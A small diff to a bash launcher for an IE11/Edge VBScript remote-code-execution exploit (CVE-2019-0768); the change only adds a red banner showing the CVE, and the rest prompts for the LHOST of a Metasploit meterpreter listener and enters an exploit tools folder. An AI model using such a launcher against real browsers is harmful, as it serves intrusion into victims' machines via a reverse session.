@@ -4,12 +4,13 @@ NC='\033[0m'
 W='\033[1;37m'
 LP='\033[1;35m'
 YLW='\033[1;33m'
+RED='\033[0;31m'
 LBBLUE='\e[104m'
 
 echo -e "${ORNG}"
 figlet -f mini "Edge 11 vb RCE"
 echo "index.html Gateway Page"
-echo -e "${NC}"
+echo -e "${RED}CVE-2019-0768${NC}"
 cd tools/ie11_vbscript_exploit
 echo -e "${W}Please enter the LHOST used for metasploit meterpreter listener${NC}"
 read LHOST
